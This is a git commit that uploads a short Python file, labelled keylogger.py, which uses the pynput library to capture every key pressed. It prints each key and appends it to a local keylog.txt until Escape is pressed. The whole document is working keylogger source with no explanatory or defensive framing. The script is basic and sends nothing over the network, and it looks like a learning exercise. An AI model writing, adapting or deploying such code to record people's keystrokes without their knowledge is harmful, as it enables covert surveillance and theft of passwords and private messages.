4e2906b21fc2950600d654a5a3c1b35c12d4cf01
Harsha2036 <145638423+Harsha2036@users.noreply.github.com>
2024-08-10 20:46:31 +0530

    Add files via upload

---
+++ code4.py
@@ -0,0 +1,23 @@
+# keylogger.py
+
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        print(f'Key pressed: {key.char}')
+        with open("keylog.txt", "a") as file:
+            file.write(key.char)
+    except AttributeError:
+        print(f'Special key pressed: {key}')
+        with open("keylog.txt", "a") as file:
+            file.write(f'[{key}]')
+
+def on_release(key):
+    print(f'Key released: {key}')
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
